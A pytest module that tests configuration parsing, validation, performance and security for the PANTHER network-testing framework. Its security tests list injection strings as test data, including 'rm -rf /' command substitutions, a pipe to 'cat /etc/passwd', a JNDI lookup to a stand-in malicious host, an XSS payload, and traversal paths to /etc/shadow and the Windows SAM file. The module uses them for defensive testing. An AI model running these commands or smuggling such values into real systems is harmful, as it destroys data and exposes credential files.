"""
Advanced configuration management testing for PANTHER environments.

This module tests sophisticated configuration scenarios, validation edge cases,
schema evolution, and configuration security that are critical for PANTHER's
flexible experimentation framework.

Test Categories:
- Configuration Schema Validation: Complex schemas, nested structures, circular dependencies
- Configuration Security: Injection prevention, secret handling, access control
- Configuration Evolution: Schema migration, backward compatibility, version handling
- Configuration Performance: Large configs, parsing performance, memory usage
- Configuration Integration: Multi-environment configs, inheritance, overrides
"""

import copy
import hashlib
import json
import os
import tempfile
import time
from contextlib import contextmanager
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple, Union
from unittest.mock import MagicMock, Mock, patch

import pytest
import yaml

# Hypothesis for property-based testing
from hypothesis import Verbosity, assume, given, settings
from hypothesis import strategies as st

# PANTHER imports
from panther.plugins.environments.network_environment.base_network_environment import (
    BaseNetworkEnvironment,
)

# ========== CONFIGURATION TEST DATA STRUCTURES ==========


@dataclass
class ConfigurationTestScenario:
    """Represents a configuration test scenario."""

    name: str
    config_type: str
    complexity_level: str
    validation_rules: List[str]
    security_requirements: List[str]
    expected_behavior: str


@dataclass
class SchemaEvolutionTest:
    """Represents a schema evolution test case."""

    old_schema_version: str
    new_schema_version: str
    migration_rules: List[str]
    backward_compatible: bool
    data_loss_acceptable: bool


# ========== CONFIGURATION TESTING UTILITIES ==========


class ConfigurationTestHelper:
    """Helper utilities for configuration testing."""

    def __init__(self, base_path: str = None):
        self.base_path = base_path or tempfile.mkdtemp(prefix="panther_config_test_")
        self.created_configs = []
        self.config_cache = {}

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.cleanup()

    def cleanup(self):
        """Clean up test configurations."""
        try:
            import shutil

            if os.path.exists(self.base_path):
                shutil.rmtree(self.base_path)
        except Exception:
            pass

    def create_config_file(
        self, filename: str, config_data: Dict[str, Any], format: str = "yaml"
    ) -> str:
        """Create a configuration file with specified data."""
        file_path = os.path.join(self.base_path, filename)

        # Ensure parent directory exists
        parent_dir = os.path.dirname(file_path)
        if parent_dir and not os.path.exists(parent_dir):
            os.makedirs(parent_dir, exist_ok=True)

        # Write configuration file
        with open(file_path, "w") as f:
            if format.lower() == "yaml":
                yaml.dump(config_data, f, default_flow_style=False, indent=2)
            elif format.lower() == "json":
                json.dump(config_data, f, indent=2)
            else:
                raise ValueError(f"Unsupported format: {format}")

        self.created_configs.append(file_path)
        return file_path

    def load_config_file(self, file_path: str, format: str = None) -> Dict[str, Any]:
        """Load configuration from file."""
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"Configuration file not found: {file_path}")

        # Auto-detect format if not specified
        if format is None:
            if file_path.endswith(".yaml") or file_path.endswith(".yml"):
                format = "yaml"
            elif file_path.endswith(".json"):
                format = "json"
            else:
                format = "yaml"  # Default

        with open(file_path, "r") as f:
            if format.lower() == "yaml":
                return yaml.safe_load(f)
            elif format.lower() == "json":
                return json.load(f)
            else:
                raise ValueError(f"Unsupported format: {format}")

    def create_complex_config(self, complexity: str = "medium") -> Dict[str, Any]:
        """Create a complex configuration for testing."""
        base_config = {
            "metadata": {
                "name": "test-environment",
                "version": "1.0.0",
                "created": time.time(),
                "description": "Test configuration for advanced scenarios",
            },
            "environment": {
                "type": "docker-compose",
                "network": {
                    "mode": "bridge",
                    "subnet": "172.20.0.0/16",
                    "gateway": "172.20.0.1",
                },
            },
            "services": {},
            "volumes": {},
            "networks": {},
            "secrets": {},
        }

        if complexity == "simple":
            base_config["services"] = {
                "web": {"image": "nginx:latest", "ports": ["80:80"]}
            }

        elif complexity == "medium":
            base_config["services"] = {
                "web": {
                    "image": "nginx:latest",
                    "ports": ["8080:80"],
                    "depends_on": ["api"],
                    "environment": {"API_URL": "http://api:3000"},
                },
                "api": {
                    "image": "node:16",
                    "ports": ["3000:3000"],
                    "depends_on": ["db"],
                    "environment": {"DB_HOST": "db", "DB_PORT": "5432"},
                },
                "db": {
                    "image": "postgres:13",
                    "environment": {
                        "POSTGRES_DB": "testdb",
                        "POSTGRES_USER": "user",
                        "POSTGRES_PASSWORD": "password",
                    },
                },
            }

        elif complexity == "complex":
            # Add many services with complex dependencies
            for i in range(10):
                service_name = f"service_{i}"
                base_config["services"][service_name] = {
                    "image": f"test/service_{i}:latest",
                    "ports": [f"{8000 + i}:{3000}"],
                    "environment": {
                        "SERVICE_ID": str(i),
                        "SERVICE_NAME": service_name,
                        "DEPENDS_ON": [f"service_{j}" for j in range(max(0, i - 2), i)],
                    },
                    "volumes": [f"service_{i}_data:/data"],
                    "networks": ["default", f"network_{i % 3}"],
                }

            # Add complex volume and network configurations
            for i in range(5):
                base_config["volumes"][f"service_{i}_data"] = {
                    "driver": "local",
                    "driver_opts": {
                        "type": "tmpfs",
                        "device": "tmpfs",
                        "o": "size=100m",
                    },
                }

                if i < 3:
                    base_config["networks"][f"network_{i}"] = {
                        "driver": "bridge",
                        "ipam": {"config": [{"subnet": f"172.{20 + i}.0.0/16"}]},
                    }

        return base_config

    def create_malformed_config(self, malformation_type: str) -> str:
        """Create malformed configuration for testing."""
        malformed_configs = {
            "invalid_yaml": """
services:
  web:
    image: nginx
    ports:
      - 80:80
    [invalid_yaml_syntax
            """,
            "invalid_json": """
{
  "services": {
    "web": {
      "image": "nginx",
      "ports": ["80:80"],
      // This comment makes it invalid JSON
    }
  }
}
            """,
            "circular_dependency": {
                "services": {
                    "service_a": {"image": "test:latest", "depends_on": ["service_b"]},
                    "service_b": {"image": "test:latest", "depends_on": ["service_c"]},
                    "service_c": {
                        "image": "test:latest",
                        "depends_on": ["service_a"],  # Circular!
                    },
                }
            },
            "invalid_port_mapping": {
                "services": {
                    "web": {"image": "nginx", "ports": ["invalid_port_mapping"]}
                }
            },
            "missing_required_fields": {
                "services": {
                    "web": {
                        # Missing required 'image' field
                        "ports": ["80:80"]
                    }
                }
            },
        }

        config_data = malformed_configs.get(malformation_type)
        if config_data is None:
            raise ValueError(f"Unknown malformation type: {malformation_type}")

        if isinstance(config_data, str):
            # Raw string content
            file_path = os.path.join(self.base_path, f"{malformation_type}.yaml")
            with open(file_path, "w") as f:
                f.write(config_data)
            return file_path
        else:
            # Dictionary to be serialized
            return self.create_config_file(f"{malformation_type}.yaml", config_data)


class ConfigurationValidator:
    """Configuration validator for testing."""

    def __init__(self):
        self.validation_errors = []
        self.warnings = []

    def validate_schema(self, config: Dict[str, Any]) -> bool:
        """Validate configuration schema."""
        self.validation_errors.clear()
        self.warnings.clear()

        # Check required top-level fields
        required_fields = ["services"]
        for field in required_fields:
            if field not in config:
                self.validation_errors.append(f"Missing required field: {field}")

        # Validate services
        if "services" in config:
            self._validate_services(config["services"])

        # Validate networks
        if "networks" in config:
            self._validate_networks(config["networks"])

        # Validate volumes
        if "volumes" in config:
            self._validate_volumes(config["volumes"])

        return len(self.validation_errors) == 0

    def _validate_services(self, services: Dict[str, Any]):
        """Validate services configuration."""
        for service_name, service_config in services.items():
            # Check required service fields
            if "image" not in service_config:
                self.validation_errors.append(
                    f"Service '{service_name}' missing required 'image' field"
                )

            # Validate port mappings
            if "ports" in service_config:
                self._validate_port_mappings(service_name, service_config["ports"])

            # Check for circular dependencies
            if "depends_on" in service_config:
                self._check_circular_dependencies(
                    service_name, service_config["depends_on"], services
                )

    def _validate_port_mappings(self, service_name: str, ports: List[str]):
        """Validate port mapping syntax."""
        for port_mapping in ports:
            if isinstance(port_mapping, str):
                if ":" in port_mapping:
                    try:
                        host_port, container_port = port_mapping.split(":")
                        int(host_port)
                        int(container_port)
                    except (ValueError, IndexError):
                        self.validation_errors.append(
                            f"Invalid port mapping in service '{service_name}': {port_mapping}"
                        )
                else:
                    try:
                        int(port_mapping)
                    except ValueError:
                        self.validation_errors.append(
                            f"Invalid port in service '{service_name}': {port_mapping}"
                        )

    def _check_circular_dependencies(
        self, service_name: str, dependencies: List[str], all_services: Dict[str, Any]
    ):
        """Check for circular dependencies."""
        visited = set()
        path = []

        def has_cycle(current_service: str) -> bool:
            if current_service in path:
                cycle_start = path.index(current_service)
                cycle = path[cycle_start:] + [current_service]
                self.validation_errors.append(
                    f"Circular dependency detected: {' -> '.join(cycle)}"
                )
                return True

            if current_service in visited:
                return False

            visited.add(current_service)
            path.append(current_service)

            service_config = all_services.get(current_service, {})
            service_deps = service_config.get("depends_on", [])

            for dep in service_deps:
                if has_cycle(dep):
                    return True

            path.pop()
            return False

        for dep in dependencies:
            if has_cycle(dep):
                break

    def _validate_networks(self, networks: Dict[str, Any]):
        """Validate networks configuration."""
        for network_name, network_config in networks.items():
            if "ipam" in network_config:
                ipam = network_config["ipam"]
                if "config" in ipam:
                    for ipam_config in ipam["config"]:
                        if "subnet" in ipam_config:
                            subnet = ipam_config["subnet"]
                            try:
                                import ipaddress

                                ipaddress.ip_network(subnet, strict=False)
                            except ValueError:
                                self.validation_errors.append(
                                    f"Invalid subnet in network '{network_name}': {subnet}"
                                )

    def _validate_volumes(self, volumes: Dict[str, Any]):
        """Validate volumes configuration."""
        for volume_name, volume_config in volumes.items():
            if isinstance(volume_config, dict):
                if "driver" in volume_config:
                    driver = volume_config["driver"]
                    valid_drivers = ["local", "nfs", "tmpfs"]
                    if driver not in valid_drivers:
                        self.warnings.append(
                            f"Unknown volume driver in volume '{volume_name}': {driver}"
                        )


# ========== CONFIGURATION VALIDATION TESTS ==========


@pytest.mark.unit
class TestConfigurationValidation:
    """Test configuration validation and schema enforcement."""

    def test_valid_configuration_schemas(self):
        """Test validation of valid configuration schemas."""
        with ConfigurationTestHelper() as config_helper:
            validator = ConfigurationValidator()

            # Test simple valid configuration
            simple_config = config_helper.create_complex_config("simple")
            assert validator.validate_schema(simple_config) is True
            assert len(validator.validation_errors) == 0

            # Test medium complexity valid configuration
            medium_config = config_helper.create_complex_config("medium")
            assert validator.validate_schema(medium_config) is True
            assert len(validator.validation_errors) == 0

            # Test complex valid configuration
            complex_config = config_helper.create_complex_config("complex")
            assert validator.validate_schema(complex_config) is True
            assert len(validator.validation_errors) == 0

    def test_invalid_configuration_detection(self):
        """Test detection of invalid configurations."""
        with ConfigurationTestHelper() as config_helper:
            validator = ConfigurationValidator()

            # Test circular dependency detection
            circular_config_path = config_helper.create_malformed_config(
                "circular_dependency"
            )
            circular_config = config_helper.load_config_file(circular_config_path)

            assert validator.validate_schema(circular_config) is False
            assert any(
                "circular dependency" in error.lower()
                for error in validator.validation_errors
            )

            # Test invalid port mapping
            invalid_port_path = config_helper.create_malformed_config(
                "invalid_port_mapping"
            )
            invalid_port_config = config_helper.load_config_file(invalid_port_path)

            assert validator.validate_schema(invalid_port_config) is False
            assert any(
                "invalid port" in error.lower() for error in validator.validation_errors
            )

            # Test missing required fields
            missing_fields_path = config_helper.create_malformed_config(
                "missing_required_fields"
            )
            missing_fields_config = config_helper.load_config_file(missing_fields_path)

            assert validator.validate_schema(missing_fields_config) is False
            assert any(
                "missing required" in error.lower()
                for error in validator.validation_errors
            )

    def test_configuration_file_parsing(self):
        """Test parsing of configuration files in different formats."""
        with ConfigurationTestHelper() as config_helper:
            # Create test configuration
            test_config = {
                "services": {"web": {"image": "nginx:latest", "ports": ["80:80"]}}
            }

            # Test YAML parsing
            yaml_path = config_helper.create_config_file(
                "test.yaml", test_config, "yaml"
            )
            loaded_yaml = config_helper.load_config_file(yaml_path)
            assert loaded_yaml == test_config

            # Test JSON parsing
            json_path = config_helper.create_config_file(
                "test.json", test_config, "json"
            )
            loaded_json = config_helper.load_config_file(json_path)
            assert loaded_json == test_config

    def test_malformed_file_handling(self):
        """Test handling of malformed configuration files."""
        with ConfigurationTestHelper() as config_helper:
            # Test invalid YAML
            invalid_yaml_path = config_helper.create_malformed_config("invalid_yaml")
            with pytest.raises(yaml.YAMLError):
                config_helper.load_config_file(invalid_yaml_path, "yaml")

            # Test invalid JSON
            invalid_json_path = config_helper.create_malformed_config("invalid_json")
            with pytest.raises(json.JSONDecodeError):
                config_helper.load_config_file(invalid_json_path, "json")

    @given(
        st.dictionaries(
            st.text(min_size=1, max_size=20),
            st.dictionaries(
                st.sampled_from(["image", "ports", "environment"]),
                st.one_of(
                    st.text(min_size=1, max_size=50),
                    st.lists(st.text(min_size=1, max_size=20), min_size=1, max_size=5),
                    st.dictionaries(
                        st.text(min_size=1, max_size=10),
                        st.text(min_size=1, max_size=20),
                    ),
                ),
            ),
            min_size=1,
            max_size=5,
        )
    )
    @settings(max_examples=10, verbosity=Verbosity.quiet)
    def test_configuration_validation_property(self, services):
        """Property-based test for configuration validation."""
        assume(all(isinstance(service, dict) for service in services.values()))

        config = {"services": services}
        validator = ConfigurationValidator()

        # Validation should not crash regardless of input
        try:
            result = validator.validate_schema(config)
            assert isinstance(result, bool)
        except Exception as e:
            pytest.fail(f"Configuration validation crashed: {e}")


@pytest.mark.unit
class TestConfigurationSecurity:
    """Test configuration security measures."""

    def test_injection_prevention(self):
        """Test prevention of configuration injection attacks."""
        dangerous_values = [
            "$(rm -rf /)",
            "`rm -rf /`",
            "; rm -rf /",
            "| cat /etc/passwd",
            "${jndi:ldap://malicious.com/a}",
            "eval('malicious code')",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "C:\\Windows\\System32\\cmd.exe",
        ]

        with ConfigurationTestHelper() as config_helper:
            validator = ConfigurationValidator()

            for dangerous_value in dangerous_values:
                # Test dangerous values in various configuration contexts
                test_configs = [
                    {
                        "services": {
                            "test": {
                                "image": dangerous_value,
                                "command": dangerous_value,
                            }
                        }
                    },
                    {
                        "services": {
                            "test": {
                                "image": "nginx:latest",
                                "environment": {"DANGEROUS_VAR": dangerous_value},
                            }
                        }
                    },
                ]

                for config in test_configs:
                    # Configuration should be parsed without execution
                    # (In real PANTHER, additional security validation would occur)
                    try:
                        is_valid = validator.validate_schema(config)
                        # The validator should not execute the dangerous values
                        assert isinstance(is_valid, bool)
                    except Exception:
                        # If validation fails due to security checks, that's acceptable
                        pass

    def test_secret_handling(self):
        """Test handling of secrets in configuration."""
        with ConfigurationTestHelper() as config_helper:
            # Create configuration with secrets
            config_with_secrets = {
                "services": {
                    "db": {
                        "image": "postgres:13",
                        "environment": {
                            "POSTGRES_PASSWORD": "secret_password_123",
                            "API_KEY": "super_secret_api_key",
                            "JWT_SECRET": "jwt_secret_token",
                        },
                    }
                },
                "secrets": {
                    "db_password": {"external": True, "name": "postgres_password"}
                },
            }

            # Save configuration
            config_path = config_helper.create_config_file(
                "secrets.yaml", config_with_secrets
            )

            # Load and verify configuration
            loaded_config = config_helper.load_config_file(config_path)

            # Verify secrets are preserved but marked appropriately
            assert "secrets" in loaded_config
            assert "db_password" in loaded_config["secrets"]

            # In production, PANTHER should handle secrets securely
            # (redact from logs, use secure storage, etc.)
            db_env = loaded_config["services"]["db"]["environment"]
            assert "POSTGRES_PASSWORD" in db_env

            # Test that we can identify potentially sensitive fields
            sensitive_patterns = ["password", "secret", "key", "token"]
            sensitive_fields = []

            for key, value in db_env.items():
                if any(pattern in key.lower() for pattern in sensitive_patterns):
                    sensitive_fields.append(key)

            assert (
                len(sensitive_fields) >= 3
            )  # Should identify password, api_key, jwt_secret

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal in configuration."""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "../../config/secrets.yaml",
        ]

        with ConfigurationTestHelper() as config_helper:
            for dangerous_path in dangerous_paths:
                config_with_path = {
                    "services": {
                        "test": {
                            "image": "nginx:latest",
                            "volumes": [f"{dangerous_path}:/app/config:ro"],
                            "configs": [
                                {"source": dangerous_path, "target": "/app/config.yaml"}
                            ],
                        }
                    }
                }

                # Test that dangerous paths are handled safely
                config_path = config_helper.create_config_file(
                    f"path_test_{hash(dangerous_path)}.yaml", config_with_path
                )

                # Configuration should load without accessing dangerous paths
                loaded_config = config_helper.load_config_file(config_path)
                assert loaded_config is not None

                # In production, PANTHER should validate and sanitize paths
                # This test ensures the configuration system doesn't crash


@pytest.mark.performance
class TestConfigurationPerformance:
    """Test configuration performance characteristics."""

    def test_large_configuration_parsing(self):
        """Test parsing performance with large configurations."""
        with ConfigurationTestHelper() as config_helper:
            # Create large configuration
            large_config = config_helper.create_complex_config("complex")

            # Add more services to make it really large
            for i in range(100, 200):  # Add 100 more services
                service_name = f"large_service_{i}"
                large_config["services"][service_name] = {
                    "image": f"test/service_{i}:latest",
                    "ports": [f"{8000 + i}:3000"],
                    "environment": {
                        "SERVICE_ID": str(i),
                        "LARGE_ENV_VAR": "x" * 1000,  # 1KB environment variable
                    },
                }

            # Measure parsing performance
            config_path = config_helper.create_config_file(
                "large_config.yaml", large_config
            )

            start_time = time.perf_counter()
            loaded_config = config_helper.load_config_file(config_path)
            parsing_time = time.perf_counter() - start_time

            # Performance assertions
            assert parsing_time < 5.0  # Should parse in under 5 seconds
            assert len(loaded_config["services"]) >= 110  # Should have all services

            # Test validation performance
            validator = ConfigurationValidator()

            start_time = time.perf_counter()
            is_valid = validator.validate_schema(loaded_config)
            validation_time = time.perf_counter() - start_time

            assert validation_time < 2.0  # Should validate in under 2 seconds
            assert is_valid is True

    def test_configuration_memory_usage(self):
        """Test memory usage with large configurations."""
        import gc

        import psutil

        with ConfigurationTestHelper() as config_helper:
            # Measure baseline memory
            gc.collect()
            baseline_memory = psutil.virtual_memory().used

            # Create and load multiple large configurations
            configs = []
            for i in range(10):
                large_config = config_helper.create_complex_config("complex")
                config_path = config_helper.create_config_file(
                    f"memory_test_{i}.yaml", large_config
                )
                loaded_config = config_helper.load_config_file(config_path)
                configs.append(loaded_config)

            # Measure memory after loading
            current_memory = psutil.virtual_memory().used
            memory_increase = (current_memory - baseline_memory) / (1024 * 1024)  # MB

            # Memory usage assertions
            assert memory_increase < 100.0  # Should use less than 100MB for 10 configs

            # Test memory cleanup
            configs.clear()
            gc.collect()

            final_memory = psutil.virtual_memory().used
            memory_after_cleanup = (final_memory - baseline_memory) / (
                1024 * 1024
            )  # MB

            assert (
                memory_after_cleanup < memory_increase / 2
            )  # Should release most memory

    def test_concurrent_configuration_loading(self):
        """Test concurrent configuration loading performance."""
        from concurrent.futures import ThreadPoolExecutor, as_completed

        with ConfigurationTestHelper() as config_helper:
            # Create multiple configuration files
            config_paths = []
            for i in range(20):
                config = config_helper.create_complex_config("medium")
                config_path = config_helper.create_config_file(
                    f"concurrent_{i}.yaml", config
                )
                config_paths.append(config_path)

            def load_config_worker(config_path: str) -> Tuple[str, bool, float]:
                """Worker function for concurrent config loading."""
                start_time = time.perf_counter()
                try:
                    config = config_helper.load_config_file(config_path)
                    validator = ConfigurationValidator()
                    is_valid = validator.validate_schema(config)
                    duration = time.perf_counter() - start_time
                    return config_path, is_valid, duration
                except Exception:
                    duration = time.perf_counter() - start_time
                    return config_path, False, duration

            # Test concurrent loading
            start_time = time.perf_counter()

            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [
                    executor.submit(load_config_worker, path) for path in config_paths
                ]
                results = [future.result() for future in as_completed(futures)]

            total_time = time.perf_counter() - start_time

            # Analyze results
            successful_loads = sum(1 for _, is_valid, _ in results if is_valid)
            avg_load_time = sum(duration for _, _, duration in results) / len(results)

            # Performance assertions
            assert successful_loads >= 18  # At least 90% success rate
            assert total_time < 10.0  # Complete in under 10 seconds
            assert avg_load_time < 1.0  # Average under 1 second per config

            configs_per_second = len(config_paths) / total_time
            assert (
                configs_per_second > 2.0
            )  # At least 2 configs/second with concurrency


@pytest.mark.integration
class TestConfigurationIntegration:
    """Test configuration integration with environment operations."""

    def test_environment_configuration_lifecycle(self):
        """Test configuration throughout environment lifecycle."""

        class ConfigurationEnvironment(BaseNetworkEnvironment):
            def __init__(self, config_path: str):
                super().__init__(None, "/tmp", "config_test", "test", Mock())
                self.config_helper = ConfigurationTestHelper()
                self.config_path = config_path
                self.loaded_config = None
                self.validation_errors = []

            def load_and_validate_config(self):
                """Load and validate configuration."""
                try:
                    self.loaded_config = self.config_helper.load_config_file(
                        self.config_path
                    )
                    validator = ConfigurationValidator()
                    is_valid = validator.validate_schema(self.loaded_config)
                    self.validation_errors = validator.validation_errors.copy()
                    return is_valid
                except Exception as e:
                    self.validation_errors.append(str(e))
                    return False

            def apply_configuration_overrides(self, overrides: Dict[str, Any]):
                """Apply configuration overrides."""
                if not self.loaded_config:
                    return False

                # Deep merge overrides
                def deep_merge(base: Dict, override: Dict):
                    for key, value in override.items():
                        if (
                            key in base
                            and isinstance(base[key], dict)
                            and isinstance(value, dict)
                        ):
                            deep_merge(base[key], value)
                        else:
                            base[key] = value

                deep_merge(self.loaded_config, overrides)
                return True

            def extract_service_configs(self) -> Dict[str, Any]:
                """Extract service configurations."""
                if not self.loaded_config or "services" not in self.loaded_config:
                    return {}

                return self.loaded_config["services"]

            def get_configuration_summary(self) -> Dict[str, Any]:
                """Get configuration summary."""
                if not self.loaded_config:
                    return {}

                services = self.loaded_config.get("services", {})
                volumes = self.loaded_config.get("volumes", {})
                networks = self.loaded_config.get("networks", {})

                return {
                    "service_count": len(services),
                    "volume_count": len(volumes),
                    "network_count": len(networks),
                    "has_secrets": "secrets" in self.loaded_config,
                    "validation_errors": len(self.validation_errors),
                }

            def cleanup(self):
                """Clean up configuration resources."""
                self.config_helper.cleanup()

            # Required abstract methods
            def prepare_environment(self):
                return True

            def generate_environment_services(self, paths, timestamp):
                return list(self.extract_service_configs().keys())

            def launch_environment_services(self):
                return True

            def deploy_services(self, services):
                return True

            def _teardown_environment(self):
                self.cleanup()

            def _do_setup_environment(self):
                return True

            def _do_deploy_services(self, services):
                return True

            def _do_teardown_environment(self):
                self.cleanup()

            def _get_service_log_directory(self, service):
                return f"/tmp/logs/{service}"

            def _get_service_ip(self, service):
                return "127.0.0.1"

            def handle_event(self, event):
                pass

            def initialize(self):
                pass

        # Test configuration lifecycle
        with ConfigurationTestHelper() as config_helper:
            # Create test configuration
            test_config = config_helper.create_complex_config("medium")
            config_path = config_helper.create_config_file(
                "lifecycle_test.yaml", test_config
            )

            env = ConfigurationEnvironment(config_path)

            try:
                # Test configuration loading
                load_result = env.load_and_validate_config()
                assert load_result is True
                assert len(env.validation_errors) == 0

                # Test configuration overrides
                overrides = {
                    "services": {"web": {"environment": {"NEW_VAR": "override_value"}}}
                }

                override_result = env.apply_configuration_overrides(overrides)
                assert override_result is True

                # Verify override was applied
                service_configs = env.extract_service_configs()
                assert "NEW_VAR" in service_configs["web"]["environment"]
                assert (
                    service_configs["web"]["environment"]["NEW_VAR"] == "override_value"
                )

                # Test configuration summary
                summary = env.get_configuration_summary()
                assert summary["service_count"] >= 3
                assert summary["validation_errors"] == 0

            finally:
                env.cleanup()


@pytest.mark.stress
class TestConfigurationStress:
    """Stress testing for configuration handling."""

    def test_extremely_large_configuration(self):
        """Test handling of extremely large configurations."""
        with ConfigurationTestHelper() as config_helper:
            # Create extremely large configuration
            huge_config = {
                "metadata": {
                    "name": "stress-test-environment",
                    "description": "Stress test with many services",
                },
                "services": {},
                "volumes": {},
                "networks": {},
            }

            # Add 1000 services
            for i in range(1000):
                service_name = f"stress_service_{i}"
                huge_config["services"][service_name] = {
                    "image": f"test/service_{i}:latest",
                    "ports": [f"{10000 + i}:3000"],
                    "environment": {
                        "SERVICE_ID": str(i),
                        "SERVICE_NAME": service_name,
                        "LARGE_CONFIG": "x" * 100,  # 100 character config value
                    },
                    "volumes": [f"stress_volume_{i}:/data"],
                    "networks": [f"stress_network_{i % 10}"],
                }

            # Add corresponding volumes and networks
            for i in range(1000):
                huge_config["volumes"][f"stress_volume_{i}"] = {"driver": "local"}

            for i in range(10):
                huge_config["networks"][f"stress_network_{i}"] = {"driver": "bridge"}

            # Test configuration creation and parsing
            start_time = time.perf_counter()
            config_path = config_helper.create_config_file(
                "stress_test.yaml", huge_config
            )
            creation_time = time.perf_counter() - start_time

            start_time = time.perf_counter()
            loaded_config = config_helper.load_config_file(config_path)
            parsing_time = time.perf_counter() - start_time

            # Performance assertions for stress test
            assert creation_time < 30.0  # Under 30 seconds to create
            assert parsing_time < 10.0  # Under 10 seconds to parse
            assert len(loaded_config["services"]) == 1000
            assert len(loaded_config["volumes"]) == 1000
            assert len(loaded_config["networks"]) == 10

            # Test validation performance on huge config
            validator = ConfigurationValidator()
            start_time = time.perf_counter()
            is_valid = validator.validate_schema(loaded_config)
            validation_time = time.perf_counter() - start_time

            assert validation_time < 15.0  # Under 15 seconds to validate
            assert is_valid is True


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
